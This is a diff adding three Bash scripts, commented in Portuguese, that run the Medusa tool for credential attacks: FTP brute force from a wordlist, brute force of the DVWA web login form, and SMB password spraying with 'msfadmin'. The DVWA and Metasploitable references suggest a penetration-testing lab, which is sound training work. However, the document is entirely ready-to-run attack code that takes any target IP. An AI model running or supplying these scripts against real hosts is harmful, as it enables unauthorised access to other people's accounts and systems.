@@ -1,0 +1,41 @@
+#!/bin/bash
+# Script exemplo: força bruta FTP com Medusa
+# Substitua <IP_DO_ALVO> e <USUARIO> conforme seu ambiente
+
+TARGET="<IP_DO_ALVO>"
+USER="<USUARIO>"
+WORDLIST="wordlists/passwords.txt"
+
+echo "[*] Executando Medusa (FTP) contra $TARGET com usuário $USER"
+medusa -h "$TARGET" -u "$USER" -P "$WORDLIST" -M ftp
+
+#!/bin/bash
+# Script exemplo: ataque a formulário web (DVWA)
+# Ajuste FORM, DENY, USERFIELD e PASSFIELD conforme o formulário
+
+TARGET="<IP_DO_ALVO>"
+USER="admin"
+WORDLIST="wordlists/passwords.txt"
+
+FORM="/DVWA/login.php"
+DENY="Login failed"
+USERFIELD="username"
+PASSFIELD="password"
+
+echo "[*] Executando Medusa (web-form) contra $TARGET (DVWA)"
+medusa -h "$TARGET" -u "$USER" -P "$WORDLIST" -M web-form \
+  -m FORM="$FORM" \
+  -m DENY="$DENY" \
+  -m USER="$USERFIELD" \
+  -m PASS="$PASSFIELD"
+
+#!/bin/bash
+# Script exemplo: password spraying SMB com Medusa
+# Substitua <IP_DO_ALVO> conforme seu laboratório
+
+TARGET="<IP_DO_ALVO>"
+USERLIST="wordlists/users.txt"
+PASSWORD="msfadmin"
+
+echo "[*] Executando Medusa (SMB) contra $TARGET"
+medusa -h "$TARGET" -U "$USERLIST" -p "$PASSWORD" -M smbnt
